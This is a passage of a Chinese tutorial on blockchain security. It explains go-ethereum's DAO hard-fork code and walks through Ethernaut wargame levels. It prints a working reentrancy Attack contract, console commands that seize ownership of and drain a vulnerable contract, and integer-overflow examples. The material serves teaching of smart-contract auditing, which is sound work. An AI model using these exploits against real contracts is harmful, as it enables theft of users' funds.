<li>❶ 在校验区块头时增加 DAO 区块头识别校验。</li>
<li>❷ 如果节点未设置分叉点，则不校验。</li>
<li>❸ 确保只需在 DAO 分叉点的 10 个区块上校验。</li>
<li>❹ 如果节点允许分叉，则要求区块头 Extra 必须符合要求。</li>
<li>❺ 当然，如果节点不允许分叉，则也不能在区块头中加入非分叉链的 Extra 特殊信息。</li>
</ul>
<p>这种 <code>config.DAOForkBlock</code> 开关，类似于互联网公司产品新功能灰度上线的功能开关。在区块链上，可以先实现功能代码逻辑。至于何时启用，则可以在社区、开发者讨论后，确定最终的开启时间。当然区块链上区块高度等价于时间戳，比如 DAO 分叉点 1920000 也是讨论后敲定。</p>
<h3 id="如何分离网络？"><a href="#如何分离网络？" class="headerlink" title="如何分离网络？"></a><strong>如何分离网络？</strong></h3><p>如果分叉后不能快速地分离网络，会导致节点出现奇奇怪怪的问题。这次的 The DAO 分叉处理是通过特定代码拦截实现。不应该让节点同时成为两个阵营的中继点，应分离出两个网络，以让其互不干预。The DAO 硬分叉的处理方式是：节点连接握手后，向对方请求分叉区块头信息。在 15 秒必须响应，否则断开连接。</p>
<p>代码实现是在 <code>eth/handler.go</code> 文件中，在消息层进行拦截处理。节点握手后，开始 15 秒倒计时，一旦倒计时结束，则断开连接。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// eth/handler.go:300</span><br><span class="line">	p.forkDrop = time.AfterFunc(daoChallengeTimeout, func() &#123;</span><br><span class="line">		p.Log().Debug(&quot;Timed out DAO fork-check, dropping&quot;)</span><br><span class="line">		pm.removePeer(p.id)</span><br><span class="line">	&#125;)</span><br></pre></td></tr></table></figure>

<p>在倒计时前，需要向对方索要区块头信息，以进行分叉校验。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// eth/handler.go:297</span><br><span class="line">	if err := p.RequestHeadersByNumber(daoBlock.Uint64(), 1, 0, false); err != nil &#123;</span><br><span class="line">		return err</span><br><span class="line">	&#125;</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">此时，对方在接收到请求时，如果存在此区块头则返回，否则忽略。</span><br><span class="line"></span><br><span class="line">```go</span><br><span class="line">// eth/handler.go:348</span><br><span class="line">	case msg.Code == GetBlockHeadersMsg:  </span><br><span class="line">		var query getBlockHeadersData</span><br><span class="line">		if err := msg.Decode(&amp;query); err != nil &#123;</span><br><span class="line">			return errResp(ErrDecode, &quot;%v: %v&quot;, msg, err)</span><br><span class="line">		&#125;</span><br><span class="line">		hashMode := query.Origin.Hash != (common.Hash&#123;&#125;)</span><br><span class="line">		first := true</span><br><span class="line">		maxNonCanonical := uint64(100) </span><br><span class="line">		var (</span><br><span class="line">			bytes   common.StorageSize</span><br><span class="line">			headers []*types.Header</span><br><span class="line">			unknown bool</span><br><span class="line">		)</span><br><span class="line">		//省略一部分 ...</span><br><span class="line">		return p.SendBlockHeaders(headers)</span><br></pre></td></tr></table></figure>

<p>这样，有几种情况出现。根据不同情况分别处理：</p>
<ol>
<li>有返回区块头：</li>
</ol>
<p>如果返回的区块头不一致，则校验不通过，等待倒计时结束。如果区块头一致，则根据前面提到的校验分叉区块方式检查。校验失败，此直接断开连接，说明已经属于不同分叉。校验通过，则关闭倒计时，完成校验。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// eth/handler.go:465</span><br><span class="line">if p.forkDrop != nil &amp;&amp; pm.chainconfig.DAOForkBlock.Cmp(headers[0].Number) == 0 &#123; </span><br><span class="line">				p.forkDrop.Stop()</span><br><span class="line">				p.forkDrop = nil</span><br><span class="line"> </span><br><span class="line">				if err := misc.VerifyDAOHeaderExtraData(pm.chainconfig, headers[0]); err != nil &#123;</span><br><span class="line">					p.Log().Debug(&quot;Verified to be on the other side of the DAO fork, dropping&quot;)</span><br><span class="line">					return err</span><br><span class="line">				&#125;</span><br><span class="line">				p.Log().Debug(&quot;Verified to be on the same side of the DAO fork&quot;)</span><br><span class="line">				return nil</span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>没有返回区块头：</li>
</ol>
<p>如果自己也没有到达分叉高度，则不校验，假定双方在同一个网络。但我自己已经到达分叉高度，则考虑对方的 TD 是否高于我的分叉块。如果是，则包容，暂时认为属于同一网络。否则，则校验失败。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// eth/handler.go:442 </span><br><span class="line">if len(headers) == 0 &amp;&amp; p.forkDrop != nil &#123; </span><br><span class="line">	verifyDAO := true</span><br><span class="line"></span><br><span class="line">	if daoHeader := pm.blockchain.GetHeaderByNumber(pm.chainconfig.DAOForkBlock.Uint64()); daoHeader != nil &#123;</span><br><span class="line">		if _, td := p.Head(); td.Cmp(pm.blockchain.GetTd(daoHeader.Hash(), daoHeader.Number.Uint64())) &gt;= 0 &#123;</span><br><span class="line">			verifyDAO = false</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; </span><br><span class="line">	if verifyDAO &#123;</span><br><span class="line">		p.Log().Debug(&quot;Seems to be on the same side of the DAO fork&quot;)</span><br><span class="line">		p.forkDrop.Stop()</span><br><span class="line">		p.forkDrop = nil</span><br><span class="line">		return nil</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="转移资产"><a href="#转移资产" class="headerlink" title="转移资产"></a><strong>转移资产</strong></h3><p>上述所做的一切均为安全、稳定的硬分叉，隔离两个网络。硬分叉的目的是，以人为介入的方式拦截攻击者资产。一旦到达分叉点，则立即激活资产转移操作。首先，矿工在挖到分叉点时，需执行转移操作：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// miner/worker.go:877</span><br><span class="line">func (w *worker) commitNewWork(interrupt *int32, noempty bool, timestamp int64) &#123;</span><br><span class="line">	// ...</span><br><span class="line">// Create the current work task and check any fork transitions needed</span><br><span class="line">	env := w.current</span><br><span class="line">	if w.config.DAOForkSupport &amp;&amp; w.config.DAOForkBlock != nil &amp;&amp; w.config.DAOForkBlock.Cmp(header.Number) == 0 &#123;</span><br><span class="line">		misc.ApplyDAOHardFork(env.state)</span><br><span class="line">	&#125;</span><br><span class="line">	// ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其次，任何节点在接收区块，进行本地处理校验时同样需要在分叉点执行：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// core/state_processor.go:66</span><br><span class="line">func (p *StateProcessor) Process(block *types.Block, statedb *state.StateDB, cfg vm.Config) (types.Receipts, []*types.Log, uint64, error) &#123;</span><br><span class="line">	//...</span><br><span class="line">	// Mutate the block and state according to any hard-fork specs</span><br><span class="line">	if p.config.DAOForkSupport &amp;&amp; p.config.DAOForkBlock != nil &amp;&amp; p.config.DAOForkBlock.Cmp(block.Number()) == 0 &#123;</span><br><span class="line">		misc.ApplyDAOHardFork(statedb)</span><br><span class="line">	&#125;</span><br><span class="line">	//...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>转移资金也是通过取款合约处理。将 The DAO 合约包括子合约的资金，全部转移到新合约中。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">func ApplyDAOHardFork(statedb *state.StateDB) &#123;</span><br><span class="line">	// Retrieve the contract to refund balances into</span><br><span class="line">	if !statedb.Exist(params.DAORefundContract) &#123;</span><br><span class="line">		statedb.CreateAccount(params.DAORefundContract)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// Move every DAO account and extra-balance account funds into the refund contract</span><br><span class="line">	for _, addr := range params.DAODrainList() &#123;</span><br><span class="line">		statedb.AddBalance(params.DAORefundContract, statedb.GetBalance(addr))</span><br><span class="line">		statedb.SetBalance(addr, new(big.Int))</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>至此，合约资金已全部强制转移到新合约。</p>
<hr>
<p>通过以上解决方案，THE DAO投资者的资产获得了保障。但是也引起了不少争议。</p>
<p>Reddit上有人说：</p>
<blockquote>
<p>“以太坊基金会参与DAO项目就是个错误。因为我觉得以太坊应该挑选一些能够成功的项目以及实验来提供基础架构，而反过来它们要想成功，则需要一个强大的基础，而且要求坦诚得面对挑战。硬分叉提议的妥协，破坏了这种坦诚，而且意味着DAO项目会反过来影响它们自己的基础架构。就我而言，这是完全无法接受的，也违背了曾经吸引我的以太坊原则。”<br>硬分叉是一个有效选项，但是它是针对需要紧急整改以太坊协议本身的情况的，而非利用以太坊平台的其他项目。<br>以太坊基金会已经参与进来，而且推广了THE DAO项目，这整个事件就是个错误，它只会损害人们对以太坊作为其他项目基础架构的信任。<br>我希望他们能纠正这个错误。</p>
</blockquote>
<p>也有其他人表示：</p>
<blockquote>
<p>“在头几天我做了个坏决定，然后我损失了2万个以太币，能把这些以太币也还给我吗？先谢谢了！”</p>
</blockquote>
<p>最后：</p>
<blockquote>
<p>“以太坊一直按其目标在运作。我觉得既然现在管用，就不该去更新软件。你可以想象一下你的投资会遭遇的风险。如果你不清楚你的投资情况，那你就会遇到未知的风险。其他任何东西都会是中央权威机构的一种援助，和加密世界形成对照。相似的，这也就是为什么雷曼兄弟会失败——因为交易就是交易，如果你为了某些特定参与者该改变规则，那么其他参与者也会想要这种特殊待遇。”</p>
</blockquote>
<p><strong>项目太大，不能失败</strong></p>
<p>雷曼兄弟事件发生一个月后，其他银行就得到了特殊待遇，你可以自己考量这是否是好事——这和我们现在的情况相似。THE DAO不是一个孤岛。</p>
<p>这个项目太大了，它不能出现问题，这是以太坊生态系统的观点之一。可能大家会注意到，以太坊基金会中也有几个人是DAO代币拥有者及THE DAO项目顾问。甚至是Gavin Wood——以太坊最初创始人之一，也在博客中支持这个分叉。</p>
<p>在他的观点中，很有可能其他大型项目也会需要救助，而以太坊基金会之前已经遇到过先例，可能需要再次要求矿工来重写历史。很明显这和银行救助非常相似：银行要承担大量风险来期待较大回报，而当这些交易出现问题时，纳税人就会“拯救”他们（除了可能的雷曼兄弟）。一般来说，这种风险的不对称性对激励市场参与者来说，不是好办法。</p>
<p>这是两个极端，但是大多数人都会倾向于其中的一个。法律专家都会如此，更别提普通人。</p>
<p>参考：</p>
<ol>
<li><a href="https://link.zhihu.com/?target=https://blog.csdn.net/u011721501/article/details/79450122">区块链安全 - DAO攻击事件解析</a></li>
<li><a href="https://link.zhihu.com/?target=https://blog.sigmaprime.io/solidity-security.html">Solidity Security: Comprehensive list of known attack vectors and common anti-patterns</a></li>
<li><a href="https://link.zhihu.com/?target=https://news.bitcoin.com/verge-is-forced-to-fork-after-suffering-a-51-attack/">https://news.bitcoin.com/verge-is-forced-to-fork-after-suffering-a-51-attack/</a></li>
<li><a href="https://link.zhihu.com/?target=https://news.bitcoin.com/verge-struck-by-second-pow-attack-in-as-many-months/">https://news.bitcoin.com/verge-struck-by-second-pow-attack-in-as-many-months/</a></li>
<li><a href="https://link.zhihu.com/?target=https://ethfans.org/posts/the-verge-hack-explained-part-1">干货 | Verge 攻击解析，Part-1</a></li>
<li><a href="https://link.zhihu.com/?target=https://ethfans.org/ajian1984/articles/32325">干货 | Verge 攻击解析，Part-2</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.8btc.com/article/93713">https://www.8btc.com/article/93713</a></li>
<li><a href="https://link.zhihu.com/?target=http://vessenes.com/more-ethereum-attacks-race-to-empty-is-the-real-deal/">http://vessenes.com/more-ethereum-attacks-race-to-empty-is-the-real-deal/</a></li>
<li><a href="https://link.zhihu.com/?target=http://vessenes.com/deconstructing-thedao-attack-a-brief-code-tour/">http://vessenes.com/deconstructing-thedao-attack-a-brief-code-tour/</a></li>
<li><a href="https://link.zhihu.com/?target=https://blog.csdn.net/u011721501/article/details/79450122">https://blog.csdn.net/u011721501/article/details/79450122</a></li>
<li><a href="https://link.zhihu.com/?target=https://learnblockchain.cn/2019/04/07/dao/">https://learnblockchain.cn/2019/04/07/dao/</a></li>
<li><a href="https://link.zhihu.com/?target=http://eips.ethereum.org/EIPS/eip-779">EIP 779: Hardfork Meta: DAO Fork</a></li>
<li><a href="https://link.zhihu.com/?target=https://blog.slock.it/hard-fork-specification-24b889e70703">Hard Fork Specification</a></li>
<li><a href="https://link.zhihu.com/?target=https://github.com/ethereum/go-ethereum/pull/2814">PR#2814-finalize the DAO fork</a></li>
<li><a href="https://link.zhihu.com/?target=http://chainb.com/?P=Cont&id=1290">http://chainb.com/?P=Cont&id=1290</a></li>
</ol>
<h1 id="区块链技术13-区块链安全-2"><a href="#区块链技术13-区块链安全-2" class="headerlink" title="区块链技术13:区块链安全(2)"></a>区块链技术13:区块链安全(2)</h1><p>接下来我们继续看一看以太坊中常见的代码编写的安全问题。下面列出了已知的常见的 Solidity 的漏洞类型：</p>
<ol>
<li>Reentrancy - 重入</li>
<li>Access Control - 访问控制</li>
<li>Arithmetic Issues - 算术问题（整数上下溢出）</li>
<li>Unchecked Return Values For Low Level Calls - 未严格判断不安全函数调用返回值</li>
<li>Denial of Service - 拒绝服务</li>
<li>Bad Randomness - 可预测的随机处理</li>
<li>Front Running</li>
<li>Time manipulation</li>
<li>Short Address Attack - 短地址攻击</li>
<li>Unknown Unknowns - 其他未知</li>
</ol>
<p>为了让本节更有趣，这次课我们尝试使用在线的<a href="https://link.zhihu.com/?target=http://remix.ethereum.org/">remix</a>结合ethernaut看一下上次课的攻击效果。Remix IDE是开发以太坊智能合约的在线IDE工具，部署简单的智能合约非常方便。需要使用谷歌或者火狐的浏览器，且安装了MetaMask 插件。</p>
<p>Ethernaut 是 Zeppelin 提供的一个基于 Web3 和 Solidity 的智能合约审计训练平台，复现了智能合约中可能出现的各种安全问题。现在已经有20+题目。</p>
<ol>
<li>首先，我们直接来看问题10，reentrancy重入问题。这个问题和我们上次讲的问题很像。</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233094.jpg" alt="img"></p>
<p>首先来复习一下这个代码的问题，以及如何可以利用这个漏洞。</p>
<p>有了基本思路之后，可以撰写代码：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  function donate(address _to) public payable &#123;</span><br><span class="line">    balances[_to] += msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw(uint _amount) public &#123;</span><br><span class="line">    if(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      if(msg.sender.call.value(_amount)()) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function() public payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line"></span><br><span class="line">    address instance_address = 0x476a5eebd3587e89d1f4f81b1fa7a724f834a04c;</span><br><span class="line">    Reentrance target = Reentrance(instance_address);</span><br><span class="line"></span><br><span class="line">    function Attack() payable&#123;&#125;</span><br><span class="line"></span><br><span class="line">    function donate() public payable &#123;</span><br><span class="line">        target.donate.value(msg.value)(this);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hack() public &#123;</span><br><span class="line">        target.withdraw(0.5 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_balance() public view returns(uint) &#123;</span><br><span class="line">        return target.balanceOf(this);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function my_eth_bal() public view returns(uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function ins_eth_bal() public view returns(uint) &#123;</span><br><span class="line">        return instance_address.balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function () public payable &#123;</span><br><span class="line">        target.withdraw(0.5 ether);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>把以上代码拷贝到remix ide中，编译之后将合约部署到网络上，此时查看，可以看到</p>
<ul>
<li>balance 为 0</li>
<li><code>Reentrance</code> 账户余额 1 ether</li>
<li><code>Attack</code> 账户余额 0 ether</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233095.jpg" alt="img"></p>
<p>然后调用donate函数，以攻击者合约的身份向题目地址转账 1 ether；首先在value处填写1 ether；</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233096.jpg" alt="img"></p>
<p>然后调用donate函数：</p>
<ul>
<li>balance 为 1</li>
<li><code>Reentrance</code> 账户余额 2 ether</li>
<li><code>Attack</code> 账户余额 0 ether</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233097.jpg" alt="img"></p>
<p>然后开始攻击，调用hack():</p>
<p>效果如下：</p>
<ul>
<li>balance 下溢</li>
<li>Reentrance 账户余额 0 ether</li>
<li>Attack 账户余额 2 ether</li>
</ul>
<p>一般来说，在调用hack的时候会报出不能正确估计gas的问题，尽量多给它一些gas。</p>
<p>如果gas不足，会报错。奇怪的是，居然出现了这种状况：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233098.jpg" alt="img"></p>
<p>如果hack正常工作，那么结果如下：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233099.jpg" alt="img"></p>
<p>\2. 为了巩固对上一个漏洞的理解，我们来接着看第一关，Fallback。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">import &#x27;zeppelin-solidity/contracts/ownership/Ownable.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Fallback is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) public contributions;</span><br><span class="line"></span><br><span class="line">  function Fallback() public &#123;</span><br><span class="line">    contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function contribute() public payable &#123;</span><br><span class="line">    require(msg.value &lt; 0.001 ether);</span><br><span class="line">    contributions[msg.sender] += msg.value;</span><br><span class="line">    if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getContribution() public view returns (uint) &#123;</span><br><span class="line">    return contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line">    owner.transfer(this.balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function() payable public &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这一关中，直接给出了源码，然后要求的通关条件是</p>
<ul>
<li>成为合约的 owner</li>
<li>清零 balance</li>
</ul>
<p>合约构造函数 <code>Fallback()</code> 中初始化拥有者贡献度为 1000 ether。<br>我们可以通过转钱提升贡献度，当贡献度超过 1000 ether 即可成为合约 owner。<br>但在 <code>contribute()</code> 中限制了每次只能转小于 0.001 ether 的钱。很明显，此路不通。</p>
<p>那请问应该如何通关呢？</p>
<p>然而成为 owner 还有另一种方式，注意到合约的 fallback 函数，即最下的无名函数。当合约账户收到一笔转账时会自动调用 fallback 函数。在这里，只要转账金额大于0，并且贡献大于0，即可成为 owner。</p>
<p>调用 <code>help()</code> 函数，了解下如何进行转钱操作。还需要注意一下 Wei 和 Ether 的转换。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">contract.contribute(&#123;value: 1&#125;)</span><br><span class="line">contract.sendTransaction(&#123;value: 1&#125;)</span><br><span class="line">contract.withdraw()</span><br></pre></td></tr></table></figure>

<p>这里有另一个问题，如何调用fallback。可以使用instance.sendTransaction({})的方法来触发fallback函数。</p>
<p>\3. 这里继续加深对第一个重入问题的理解，在最后一步hack成功之后，自己账户余额是一个很大的数值。这是怎么回事呢？</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2**256   = 115792089237316195423570985008687907853269984665640564039457584007913129639936L</span><br></pre></td></tr></table></figure>

<p>这里就涉及到整数的上溢和下溢。</p>
<p>以太坊虚拟机（EVM）为整数指定固定大小的数据类型。这意味着一个整形变量只能表达一定范围的数字。例如，uint8，只能存储[0,255]之间的数字，如果想存储256，那么就会上溢，从而将变量的值变为0。相对应的，如果从一个uint8类型的值为0的变量中减1，就会发生下溢，该变量会变成255。如果不加注意，而且有没有对用户输入执行检查，就有可能发生攻击。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">contract TimeLock &#123;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint) public balances;</span><br><span class="line">    mapping(address =&gt; uint) public lockTime;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">        lockTime[msg.sender] = now + 1 weeks;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function increaseLockTime(uint _secondsToIncrease) public &#123;</span><br><span class="line">        lockTime[msg.sender] += _secondsToIncrease;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(balances[msg.sender] &gt; 0);</span><br><span class="line">        require(now &gt; lockTime[msg.sender]);</span><br><span class="line">        balances[msg.sender] = 0;</span><br><span class="line">        msg.sender.transfer(balances[msg.sender]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这份合约的设计就像是一个时间保险库，用户可以将 Ether 存入合约，并在那里锁定至少一周。而且通过使用increaseLockTime函数，用户可以延长超过1周的时间，但是一旦存放，用户可以确信他们的 Ether 会被安全锁定至少一周。</p>
<p>上述代码有什么问题呢？（lockTime的时间是uint类型）</p>
<p>那我们来看ethernaut的第5关。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  function Token(uint _initialSupply) &#123;</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public constant returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样的，可以利用溢出。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233100.jpg" alt="img"></p>
<p>\4. 看完前面几个问题之后，继续看一下其他方面的问题。</p>
<p>第四关telephone。</p>
<p><code>tx.origin</code>是一个address类型，表示交易的发送者，<code>msg.sender</code>则表示为消息的发送者。在同一个合约中，它们是等价的。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line">contract Demo &#123;</span><br><span class="line">    event logData(address);</span><br><span class="line">    </span><br><span class="line">    function a()&#123;</span><br><span class="line">        logData(tx.origin);</span><br><span class="line">        logData(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

